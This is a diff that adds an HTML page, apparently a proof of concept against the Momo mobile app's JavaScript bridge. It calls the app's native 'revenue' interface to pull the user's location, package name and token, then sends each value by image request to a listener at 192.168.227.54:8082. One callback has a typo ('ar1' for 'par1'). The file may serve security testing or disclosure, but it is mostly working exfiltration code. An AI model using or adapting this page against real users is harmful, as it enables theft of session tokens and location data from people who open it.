@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>GetImage</title>
+</head>
+<body>
+<script src="http://cdnst.immomo.com/momofes/js/mobile/momo_bridge.2.0.4.min.js"></script>
+<img id="content">
+<script>
+
+    function getTokenCallback(par1, par2, par3, par4) {
+        alert("Get your token: " + par2);
+        document.body.appendChild(document.createElement("img")).src = "http://192.168.227.54:8082/wallet/" + par3;
+    }
+
+    function getLocInfoCallback(par1) {
+        alert("Get your LocInfo: " + JSON.stringify(ar1));
+        document.body.appendChild(document.createElement("img")).src = "http://192.168.227.54:8082/wallet/" + par1;
+    }
+
+    function getPackageNameCallback(par1, par2) {
+        alert("Get your PackageName: " + par2);
+        document.body.appendChild(document.createElement("img")).src = "http://192.168.227.54:8082/wallet/" + par1;
+    }
+
+    // window.revenue.copyToClipboard('password is 123456');
+    window.revenue.getLocInfo();
+    // window.revenue.getPackageName();
+    // window.revenue.getToken();
+
+</script>
+</body>
+</html>
